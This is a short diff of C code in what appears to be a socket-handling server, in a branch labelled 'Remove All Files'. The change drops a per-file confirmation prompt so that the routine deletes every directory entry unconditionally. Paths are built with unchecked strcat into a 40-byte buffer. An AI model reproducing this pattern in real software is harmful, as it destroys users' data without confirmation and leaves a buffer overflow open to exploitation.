@@ -140,18 +140,11 @@ void func(int sockfd)
 						printf("Remove All Files\n");
 						d = opendir(path);
 					    while ((dir = readdir(d)) != NULL){
-					    	printf("%s\n", dir->d_name);
-					    	scanf("%d", &retval);
 					    	bzero(file_path, 40);
 							strcat(file_path, path);
 							strcat(file_path, "/");
 							strcat(file_path, dir->d_name);
-					    	if (retval==1){
-					    		printf("Deleting\n");
-					    		remove(file_path);
-					    	}
-					    	else
-					    		printf("Keeping\n");
+					    	remove(file_path);
 				    	}
 				    	closedir(d);
 						printf("Done\n");
